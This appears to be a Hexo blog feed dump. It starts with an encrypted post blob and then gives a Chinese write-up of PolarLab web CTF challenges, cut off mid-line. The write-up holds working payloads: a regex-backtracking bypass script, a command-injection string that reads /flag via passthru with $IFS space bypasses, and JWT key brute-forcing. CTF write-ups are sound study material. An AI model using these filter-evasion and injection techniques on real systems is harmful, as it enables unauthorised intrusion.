c0eba3dca7ee86cdd356eb76f3d733a5bd9f60b57c701b785cc29da442b665e84d2363b2936c79cd583b8f8d4809e217ff7a30784137e517960ac9e36e786c27458795fa53c8628f899f9b7738b2872365b6cb6feb05af4d1a93aff55050e4cdde4dfa885b536ca0bb348ff5da0c4781789b38cdf9468a25f54910279cee77a91aa37c1bc0e75dffca2f47f81c68818b5add3159e7a1c7b85c9495ef23b18ff92917cdbdd37efa82fcacf4454d8ee299da2b8c4cb58d663539ee264452fc3e61a7ee154c3adca68483d9a93005021118716f98148e5f09aaa001c137e546af41e7ca5a6c5b4631183254485fd24876d5aba177e5e9ca1d267857e60d9d7f36053bdebe8fa80c0a63f05d94a2e4751bfbd31f89f7b6db0238b4d0742c59c1a7f3aea93e48f109f399769662db987776d09019874ce9b66506e813e509e6061e94f26a9b791943ca9f88aa15bbf70ccc05ae2dff7077bfc7b849f27399df98f16980603f43a7ec7f6bc5de66cfac88f06f7f0f1facbf5dd16c23f438deb50d2fcd4b1619b7f9ee29f119675bdd3f8471f253142825a4f5e03f96d540ada8d4df5ac4f6410f3b5d51e6c2474c6a33c79413d0f5231dd57163ca5b0b992d774255ff85fa1847e25b0e05c2a89c09fdf870cf7834f34e2c31ce1228b0e87b8bf0533d435db06067e47775d35e0247a8f7e9b68bad31d6603631157b24cd9485ac13b22f1bbd6b66fe0b19c210010279efa2dc90b4aec04d8c3c44775c418b95ac1da87c6eb07f2d3d42a22740094b7b67c424de98d63c61bb8c4073c9279a2cdbe574a0c0b5904a48ef84142f17f584a7a379bb3985982ed4bfdb4136b29c3d00ce36411ae3a19be19e45c694bfb0028cd4e52d2b111d451aa5fc806555563a27cf2662c689e243f8ed7e8219f38d9b039d2065be0c224b307140ed818af1f5c57c66077516d71616f772ff4ee63d86af1afbdf24c1e915fad5a42e4ebbc84caf72afac27e925ac415c0c1854d5af1e76965f48799dce4f070613aa1b61210804612f137c958a75077c96e191facd220a00d8e391a8b1aa930351e1e603fb697aac046c681b845ed6a31dae2947b6164eba5b592983b9fda31e031d6559a87b576a97154636cc0936435143a0b2cadea3f8252119de056c46a5199427948e405e24c0b7eb8b1fc9db6f86010600ca0494867af40942d6de3a82386d293397c8ba8c67de14a8f519a35b10024b9f11af1eb7d39af9a8975a7a4b6811237174646b4ae3ecca6608fb908f35aa6820d64950eee5939f50bfe713cdccdcd91e2f9f9b00178b05fb87056c19e1d63c7b211e47b721ca52e3137ec256bfa2f1794bd2a8aafc9d0b0cfd285ac8d6483391ff0c04bdef65ecca4bcc14325aefdf75d27707ad2c0476afa419c5c6918a4ef9625aa357d70a8b5822b8647b184fb91daaa84bc4e141d2a6a9f4667132b4c453de0222cef3f9f2ae0ed4db62792ce10caa87b3f97ea894e0f4e99e698cbf558183d50f130e3fcd3c376d88a275e51335a3db53b8cf84c143dca0291c6b7ac68b6b41fa765ad32a0467fd311aea3e27a690d69add78f62b75b2fb98563c9ff63dec3671644d265817b8f6f428e67527e7c211e8678edc9d220f8fc239cf0f8a0a90f069f631e59d4696079942f23ec7bd72167d84f8404b0d017f8720678a83c286e4187e756e08c3c05ec02ac59e19c0b22d0dd6ea5eb119ca2eaf3aa5da897b19dbf93a09727d146a0dd8fd2710a16e7293086e82c3f559c48ce6e32a323a7c48577f59b094c0fcf3f13397232fe1b1e2ab63927c369e605d2c1283cd5b09b445b9d104eb4249e245cacad12313cf4f91e96ff06f4d16bfe331547dde4be5bb1f266014685e082ad033b63ae14e5a44c1af66b0fe8fdb54486bc72e7067df10ede96207c5482d5453cd6280c225243f543e48ac889d870f9ade027558e077963aa6bbdd7c9482c7679dad1b65ee5094db05b2c5104157e284a67f1b38c6338c2ab31eb35b948ecc156832f267dddef8c244896a0bc073869f1c3b304b02ea989503799201bec31bf5164f01f5fb2911d00c3bff8d68c8ec1e0756d9d13757238f7e651eca41f716ce4244d6f91f7a610b31d9600eaa8d732e891342b42865a94f65b8b151403e3ee1b417e9b93fecbc8afd371fee4cf6d406f27f124733f371b1a38ede15d4bd9edafbed97afe637ac45aee99c1ca5f31b6602c9b5c74d0c3d9a042a6735d45035476a5bd52328c327dbf9969206209a27ea477058e150426fd20c0e3478396989e6a4165db8e9d06ae25cc6784277b8a6401a19202b74bef05cd8949abb59951e83d4f4bee903f74c070d156df082c9df4d642e3b109f971bd5175cea7ea5c3d4e93ed48c4ef5ba51aecf09c8e00012c48b40068aaf8c57fb7babda3f210609b13f5d5cb283ea01999f82778e7b026a05717e79e694818586e385fdeb08eb835c8b5a6f01b712e17e0dd4b3b2355a90c84783f7a3a8bb9127278f8976519d014713c74d54567d4076e854c14a62d198b3bc67b14fa8ba4c801632fc5753dc22c00761abcb10438df29a64736200eb52acf3bcc2aaf65a34f2213d2bc2274fb01753909064cbd2c857a81292ce1c02a8cab9ee8040c64b93d8143b17c2fe440d67bee8738575af746363c970b16f89498e281060ece7c3805b38e894c0170af6041c19a319ca2acc070c1cdd82d41e58a40553f16886f545f3e03d1d1c6e057179e599e583719cd01d23dc509c4fafa3fdb660026803639af7314b79a58d4d3940107d345ada15f85ef15042b8a18484238e428a58c1e02cdd6b7cd6c31e5a98e6d2fc4da22d68e748fad28b61ba96bbda6214c1feb60d3d9bee455042646121fbb2ee799b5626b0ff1ab3096fd947295b52904a10587613a4e1e9888882ee5a42e2166417497f2cca6fa7a11042049ab532c1c5c02968dee603fef9df3a0dd60cfbbe7fc7a064b007a917bd7bb6806eff6cc2790ac9efe8345543dba1225a84e53af9d2a6f2a8a982dce5c0f10362a272d97faed6c4ed9f8cccf1a3489178513b1cca2b4c627b76a4e6d8f8756954605236afca7a3d63975d79d2b72ef9d076f16772d53512e886a9f30db3a18f7f65d3a6a4c3f24301db00c947668917d41165b98179d974023cac79b991b6cbc0d7fb4150bb2a00d33a4fdd73ae8247745f905dbe7380675a92ac8b5c355fa06f6fa9a4dc0d978d7545554f1f7a29ed20c1ecfd7fe7d976eab557013496dad0501737b67e6ddbac4e5e4342fbf6f3e3903064bc978bd7af67879810df95dfc7b6dae55884dbd4daa70414f9d5741db7a73c0c9dead8d42a208c607c8efabaa53bb8a5c3fa55facb1674214cdcd1357f4b73b6f33ce7d2d182a96c834ac239ebed523e838fde4b8e725325b96886672d0f1d437c91ff544588553831fe32425022e90ee4b4871a2e640535fbc3c70da0e20380b44fb10e99b209ec91b813ddffb470aed5f6694be727386b2ae2721da900b81a854c80832f6fa79ce9295a9ae87564728d329f50fd1237751b21a791b4c5e52b92ff44a751113ae01fed86921580f8004b386e684a4eb6e2c1696006c9d92357b9bcf311551243a5ed9cbb7aaf6f9a04a137ba305dd3d13b47052d0dbeadcb5cfea4cc479c78b84113cce49584b8a9d1f4e797dc4fb6493c35e0045745b13602a0d302adbd59681abe31c845af7b803f6de019ae99d1d14edbc40a3e5202458777637c939c65b414e71e7ea2f08f7f187583d5daf9763a52654b480592d14c45ff0ba4c5c405925b428c88bfc4225c47e6050dc08223e6cd6d59283993578a679555419eac5f83cacd1b00a0954f466477bcab89bcec1221fd048a189bca91a49d002e46274f34a215a409f4879578cec0314d608df00539232c75df67d96668a728cb8da825a7449a6dc67a0f17b15e9168dd887810981609bbd4ddcc0c925e30cd30a15a202b5c75719e338fb1f6933d33bff0c7f0325ca7cf5b85fddadfe35aea2a1661c386c63c5ce9d5df1f8ca4aacf9ef086baca351038b85b7b2568fc51124a8cf944ae68b9912c41f879f0ed302f718c491068ceff59ea0c0f568f9a667d5d1b0cf64dea4c92b37f9c72c8184bb78deaf5e96c905a7571d735847e09b195c95465fb0f2add37d80c98ad3b16f4107efd835948d1fcc4fbcf8b0e2cc406a7d50a4bd29e4adf07f821d4139697e892ed3af43f5893c9c0efa939e82321ee6e989095424bb4c4278a238ecc941ebc2d05ecb29721522e46400bd9e788e32d9f0a58c0d785c246d02ab1d3b648c69fcc6da4058866133a9ec9e56f54545466817ff991ee35b08245c9b534413f55423dcc09569671900ad675e3d7c3d82239e19b7bb38577459e28b539ff08ea9e93d9925df12cf8015610a554989fb30d2e418a5d0b6ff4849849d7f69f4e53a06b6833f1c66e55fd6b319d6e13835d92353938d81938f8aae946ba0ab0e9899919abdb8200eee9790d6bab447473af632c57f91bbee993e3f9d5c7971b4223781a0e379d7b76c6e6d94e84684d07bbbeb19b8699d11acd89f961734442f35ae5b6f2655b9ae2289ab3965875af577528fdf5c16f53fae8d16b213c4668a9dd250925afbaea9a905e108d05b00da6e9b32f24713911c55af271a2333090f7071d71f67c593180b4e37ceef2c6b0c8a7cadf5544aa9f2031276fb49bcd2592ec5137325fe4ce0b71258eb361e37c921531a82ebf524d50e5e0128ea8cda0cb40d8ac86949541af5006402a7493e63b4b6a82759b023d2e062c8bbcd4c32b6ec78f4ef6554a5d2e5791a34c018539d18174d436b87b88b4f9827de43c2abff7349ef30c7e6cf3293a2a965eae4aa5aef4243f99d834ef2f6e9f053d1f0135185f25a06554482c30974808f5216135d9c5e00ca58131cdc7cc0189d87c07f9c7655f9c8a1e1ccb31346eb6148c887048f361eb8421234361979a506a8324fdd310f7c383e90bfbc4a6831c84f59c2078c94681b450ca3ec21de25abab57b6f83e0232ec3fc36e83c174fde28d13098a14ed54e2f46dba61bdf98dd1962568fe59166629e01c29963e3bbe177fd9b653edeafd5791ffbf8ecff4c63d5adddc86317c305ba06c98ed9cb73d4d1e847f9576cae3531e5dde10bfe7fe1f1df6695997eb070d2b8b22b4ad1e22b5d86cdacf377a2c2b6beeefa2e02badb9f910d5530c07464baab03e0db5fdd7e4c6ca56f1bd84966d4a9dbcc4907dd69d2316495df7fac8384eb921598e3f2e30a6728bf68e11932e9196344295215ca5c6128b0a0edf29162a5e0a4352397483de33026fe1f25d2778e62f2810d19fa95b0c3898719c3737a3c57e8c91e6789f7b6cffe05dc65f4966464bb71a7ea70260ab68aafb105a37036ae6a03db125e3b22d076db91e707c7e4c62ba404a54a2bd3112770714a0bc6bc69a4158fa17ffcff19d1abe2557a03ac467a4becd2492b4a6f2af3a2c8e1ecd18d276ca8a971bc4d249e804700e2ca7738360a0947ef4df192d4c180d7baec08ddb01c40293c343501058fcd67e073dbc0eb92ca2c89a71f650976dcafa17f69f3a217b7df4dfca9234da3eac204603944173e3ef29e115c2d5b1b33765fb22e33eb7a31a467b92310bf5607f77bf10d4f84ceeb7ad1d80ada08ab743479831429a8c10c421615b57c2a66a7a5b0cdef76beba38acced5f2b5fe782be806e1ef87a202bbf3f77377e9bec1c41a14cc2fe23a8c7df521a4a7883bb94b197cec4f82cb228b9e4a8e2c45e6d346ee192c28379e26fc61edc4463f93f6a1970c9a8697d120f2d91084de880cb691860dbeacaa3bae71e434137f53a95202db55b8a29d92134cb0cdea31641a40cccf1f5774587134d298c034d3a94c57171803ccd83ab4472f6ed8184b2c35538ae74c976f1e7fe4e76ffc1ab6fe0d42764d4d42bc4a9192839205318f5aea262c3f377c1d94c64208b2e19f5abcbc2a7d5864c53c75d58ff31600b8c1790e8dd4e21b4955294c8b309a41f507ea662778da4dc9dbf90fcc3fdad3f6afc824f8f29f9fa19d7f306f4752bcac205f1f4486fd9f2b3d69aa0160de8b0095e0ac2e5d847eec20260a243a023428d2a53cfbefdd1eff61d3ce0ffc315ebd9aeb56a8bb8fc8b86c2821394afb1a2eb2a545c58d5a5365dec4162c8701c3d426a5fe1893e842836ba4ab2553042ad9f3154b666103a5a8b26c7db5ced531fe1c28d713947cff5e2c3d208175c6744160761f2cb382e8f275b96c8124ef53adc6f52b8418247e25654126aa79c38785856cd00a843c5eb98fef483650ad9cc2fc612fd6fc7c6e7427725549661389026fc0af834100f0b1425247c11596169eb24c9fffea32b66f8a1ede54dc471d23149213a9671acee223b28719f64bc055d9e0ae1e61d57f7b24e6151eaf984d7f6ba22015e34033abd22837067920ced3e4fdbab32dd1f90de0c31950b3dde11948e82b5314c798e00df13d868bea256a20572ae574752e57c08a25c16c91eb567e21da1571b45ee156504225d0308b1b187ba00d0fea48c5b4a57e3c8c65a43efba64729a0cf212687a091b9c0f33fe3a0252c0d819896f6e1c66d4b7297b7d2b192728e809aded195af97197631036b3f20fa19bc4e461995827d222e19b725a2db284c84ce8c9f93caad6da3cb497823d1375d764c5c67e37a643ef769b827ebb5be4295bbcb84b361a1c2e3164ff3ff9ae7fd47d09185fd81fc229c268735b2c02861f2eb9924c16120577e63d5ac15d1d3191dff4a60602a578f07f3d8553fcfb921c7dbb564c6e684a4200dd929586f531ebe2d4b06bb2fcedadd075b032bbe8d65d5d4fa94e2be9fcbbae397c06a7ff0bcfdd704bbf9e2698f5f33dcfae8e301746b84802f3003374a423488eac01c7c19e27e5e730dddc94cc925d21372eb21494f3bc5044f31dc04a6e1bf3b75dd89fe0251a99dcb145ef9d5483994ccf5076690dc17a16bcd8361b5118301c5f4fc7a1416b4926d9f9db3f86d6823db9bfa58ca1c80d6207732adf7b75c1ff5820ac16e21ed908fd9190009fb8ef000e15b56d1566105123821b34e00fdb6f655e26726d50a8b6e03f96c5204d328912879c5e02ccdd5f07adf17cb49c40110b314cc9e2537f06988294eb26b7819e0a456bc8d6238e2100de0c45a447f4feeef60d67ec118546602914aded6b2f19e34c4b826ee9634041dd59940109dd0f0d27eff03d0715cc8118850dbaba0c0fcd5a78c7f0415c145b3a8ef6ed17c775731c4f92534fdcaa3f18252adfe4fa4ce00adeb326b6e333724b1b4595636fe4f474927b2318da29a25bf312ccc0761d95f880b6e293932c6144161b7fcc8d669ac3dfcabf6e4bce6331cd8949e115cb2e5ef10b3495a6662f48b05ad9b636ade047c0e25c460abf6eeec97dc6240edacebe2bca33e1ae6e940241f660388de43eb6b2416ebec3b20c1cf0ee2ed8e28fc84cd5450c6dae458101dfb68826caf716f48a0849504be91d2c3a93a0b0e3275f8cce0d6291054afa45345ce38906658d904d1a409969403e1921b118742976612fbb80506202d81492de5cf04d803facae021d5f58fae8430f4466dd15b65cd81c88e835666c5a5de44f7b38aee3d645167182621a4bf3342d80e0bf0de576c8835bc4955b8b7129b9cbb61f85799c7dcd29abff85e83aaa2bb4ec56efcf0ef6d175b2159f91f362c1c436799073201db28f5c514d6508204fe345e042583bb91b39b8ccecfaab3d12fbc3eaf936a6ab579abbb5b3c3713e160ca60d87751c2d395579334704704a9af962f77413ad45c4aa309c387b5d8eb675e220fb8892f12ed2fd61a64a53c738ba24b86ff20b6c9c84f68d76aa449cce2075ab6b4d4f21d2049f54aef61f8625d0bed6a1a526943c917cc0ef6cdd05fb3adebfcaa9be8d3e3a158f592acbd18f54ee795cb7bccb3ecbbd54fb136961238620800cd1ca2f7746a8e4f5225406b8e64c71d05b8d00b16b471331d1ca7dedd27c127bcd2660d8b1af65380eec0a6c991ea05c498a668fe888a2309fdb13f38859c4cea1b74885a8ef03025c0e477d45aa8a914976d132fc6afb0368196d7f79517643f3510e9d933f2f8a783e55c7f333e9ea0b31e683ecaa51f8c227381e558fbe4f5e0f5d362b063ac3254ab1cc9b05919f390a475b2e2e9259984bbf2fad4f76ec8a3e0e0286d0104c4cb00e9ba5f3c9644d1b598ade519a169b5efcd4ec11dbbf7ab79c01d1fd59b254c533a811a7ba40c04137ce4ca8f30cdda47ad5ab505533addc5f018ef68414a591e5627c2f62b7504534572daed790c44e5e1382340b0865d2aa6af987aee9957327a38c8ba40c06c3f2abaedb79efe15104c3e5ee35ab667fcb37bb265ab7bbd4d9c76d69c21a02eab8434bc35e2ee217c61ab64f74811b8d15d8e4df2eee38d81ce78e4e19b62bd2e3fe789f24cc993628dcec7a03046f71027be9fee2f7fb968bfaa3809dfdc6443b1ddaa393882f6e07903325d87785b60bdf358700cf5c9fcc206dabf067712f588c0bff023965045bd2d5034a1e3b0b226497ad69bf4e864ccb6e037134cd99eff5803ce53dd55e418d656f126adab4931103041aa69605e2c5e6382e20a8a2d4d81d1de8271eee6454a2b089ebf57df96b75814d9fa69fef0657bbce18b049913f06a28bbfebac1747b19ef74da87391d3f4218f09b7c513c1e5721af6dac9cb1f4c1d5db2c8b6e82709d65cd5f05e6dc3bc331d78fa0e3eaf68e708bad2eff1d6488f09770148fb4b5f3c364299f5268c318ffa8bf61afbbe097e6ea915e6c1365129c1f9c234be19d516f64e64239f02fd30b4cbe07c285dc6dd9eb56b15d903ec452bfd0cb931ebc9e48197e9a1db2c67fb44c806acbe9e6ffd850ef2b2b39ff7cf6091db48266030678098031aba5b288e5234b7fa3531cd19806a511fe552feb39776885bbafed39ac2fcda76d94e6db9baf5e603db96e7d8ea1117ff067a0571febb29edf949f726e7bd1fd0e26910ba51dd4d49dc541312cf532d7508cd8038e64af0fc02fcd9ae893b2d33fbad1f0c0bab19d6c7345dc5f9577e771dbfe63cb05786ded1b3183ca4185b7515b2be031bb7c27afed05bf5ac632b274c1277ac27e068a0170afb4e6e08598c37ad663e09762f134d10964d548e076a0f400f281c56757e729abc6706164ed036b8813f760976e0387059161fa76cde909b12517cb64adb25f3d09252d2dcc4d0bcbcf44bc8fa761a621bc522222919f8e7c9b181d29a426925262105cdc8de67b0f0582272cc8f7b7414f67cead164fd4fedfa6118317299061e025afb2bb0266a5b455921fa8cb9783e188034f4d2e425752efe43584bc855680f49e66d402736cf71c1d0b4e1d594e33dc4d9a7af2b586a900fb88724e3ffc248599dfe723b7e60b5b7047ef7eb13e02e8bd9507180bc44cbc144604de71200fc9f76910442c4fe5289875662b427a8e995426a70b1fae54dac2fabcab8841683def8ede9a7d6f358c3786ff60aa0742ff0cefb098174b985fbc2fcf2d7dfa81bf2ed0659dbbf46570f2e54ec9fffb20b397b40ea88275aa7afe3eafc4069ed43a8974dd6791cb68ed7c98d5e7b2673b4d0f69e7f836dcea0ad3c61bfb1b25ebab033a4d557dab95a3088f2ea508875c428cbd042be9d0e0b4fd9e0f6d22b1e259cb3bcc7473f6917331d731463d6df529bc58da5be18183fcca407f1bc509bd97e0fdbc0d0985bf7ed88296feeff441e6f91a6b972159b3bc4</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Maybe have a guess</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NewStarCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PolarLab-web-Baby</title>
      <link href="/2024/09/21/PolarLab-web-Baby/"/>
      <url>/2024/09/21/PolarLab-web-Baby/</url>
      
        <content type="html"><![CDATA[<h4 id="swp-正则最大回溯"><a href="#swp-正则最大回溯" class="headerlink" title="swp(正则最大回溯)"></a>swp(正则最大回溯)</h4><p>先扫描得到<code>.index.php.swp</code>，得到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">jiuzhe</span><span class="token punctuation">(</span><span class="token variable">$xdmtql</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/sys.*nb/is'</span><span class="token punctuation">,</span><span class="token variable">$xdmtql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$xdmtql</span><span class="token operator">=</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xdmtql'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$xdmtql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">jiuzhe</span><span class="token punctuation">(</span><span class="token variable">$xdmtql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$xdmtql</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'sys nb'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'flag&#123;*******&#125;'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'true .swp file?'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'nijilenijile'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>考察正则最大回溯</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestspayload <span class="token operator">=</span> <span class="token string">"sys nb"</span><span class="token operator">+</span><span class="token string">"hsad"</span><span class="token operator">*</span><span class="token number">1000000</span>url <span class="token operator">=</span> <span class="token string">"http://1ce7c85b-bed6-4e28-bf60-fcfb671efc81.www.polarctf.com:8090/"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"xdmtql"</span><span class="token punctuation">:</span>payload<span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span></code></pre><h4 id="简单rce"><a href="#简单rce" class="headerlink" title="简单rce"></a>简单rce</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*PolarD&amp;N CTF*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">no</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i"</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token variable">$txt</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what's up"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$yyds</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'yyds'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$yyds</span><span class="token operator">==</span><span class="token string single-quoted-string">'666'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">no</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"nonono"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> nonono</code></pre><p>命令执行函数</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 输出并返回最后一行shell结果。<span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。（替换system）</code></pre><p>输出函数</p><pre class="language-php" data-language="php"><code class="language-php">cat函数 由第一行开始显示内容，并将所有内容输出tac函数 从最后一行倒序显示内容，并将所有内容输出nl      类似于cat <span class="token operator">-</span>n，显示时输出行号more    根据窗口大小，一页一页的现实文件内容less    和more类似，但其优点可以往前翻页，而且进行可以搜索字符head    只显示头几行tail    只显示最后几行sort    文本内容排列</code></pre><p>空格绕过</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span><span class="token variable">$9</span><span class="token variable">$IFS</span><span class="token variable">$9</span>重定向符：<span class="token operator">&lt;</span><span class="token operator">></span>（但是不支持后面跟通配符）水平制表符<span class="token operator">%</span><span class="token number">09</span><span class="token operator">%</span><span class="token number">0</span>a 回车<span class="token operator">%</span><span class="token number">0</span>d换行</code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">/</span><span class="token operator">?</span>sys<span class="token operator">=</span><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sort$IFS/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">POST</span><span class="token punctuation">:</span> yyds<span class="token operator">=</span><span class="token number">666</span></code></pre><h4 id="蜜雪冰城吉警店-js"><a href="#蜜雪冰城吉警店-js" class="headerlink" title="蜜雪冰城吉警店(js)"></a>蜜雪冰城吉警店(js)</h4><p><img src="js.png" loading="lazy"></p><p>修改前端任意按钮id为9即可</p><h4 id="召唤神龙"><a href="#召唤神龙" class="headerlink" title="召唤神龙"></a>召唤神龙</h4><p><img src="js2.png" loading="lazy"></p><h4 id="seek-flag"><a href="#seek-flag" class="headerlink" title="seek flag"></a>seek flag</h4><p>Cookie:id改为1 flag1:flag{7ac5b</p><p>抓包响应  Flag2: 3ca8737a70f029d</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>焯，爬虫要是爬到我的flag怎么办<span class="token operator">--</span><span class="token operator">></span></code></pre><p>查看robots.txt</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">#flag3:c0ad71dadd11&#125;</span></code></pre><h4 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h4><p>响应头：Flag-is-admins-password</p><p>随便注册账号登录有个人中心可以看到密码，抓包得到jwt 不过要爆破key（看wp是4位大写字母<del>不知道怎么爆的 恼</del></p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">1</span> <span class="token number">4</span> <span class="token parameter variable">-f</span> /usr/share/crunch/charset.lst ualpha <span class="token parameter variable">-o</span> ./4ualpha.txt</code></pre><p>生成字典爆破 key为SYSA 将用户名改为admin即可得到密码</p><h4 id="login"><a href="#login" class="headerlink" title="login"></a>login</h4><p>源码给了提示<code>&lt;!--20200101 20200101--&gt;</code></p><p>登录上去 只显示了登陆成功 没思路</p><p>看了wp说是使用20200102返回了f 然后依次往下爆破😅</p><pre class="language-php" data-language="php"><code class="language-php">flag<span class="token punctuation">&#123;</span>dlcg<span class="token punctuation">&#125;</span></code></pre><h4 id="iphone-UA标识"><a href="#iphone-UA标识" class="headerlink" title="iphone(UA标识)"></a>iphone(UA标识)</h4><p><img src="iPhone.png" loading="lazy"></p><p>尝试找个iPhone的UA头</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment"># Safari 用户代理字符串</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>iPhone<span class="token punctuation">;</span> <span class="token constant">CPU</span> iPhone <span class="token constant">OS</span> <span class="token number">13_5_1</span> like Mac <span class="token constant">OS</span> <span class="token constant">X</span><span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">605.1</span><span class="token number">.15</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Version<span class="token operator">/</span><span class="token number">13.1</span><span class="token number">.1</span> Mobile<span class="token operator">/</span><span class="token number">15E148</span> Safari<span class="token operator">/</span><span class="token number">604.1</span><span class="token comment"># 爬虫和机器人用户代理字符串</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>compatible<span class="token 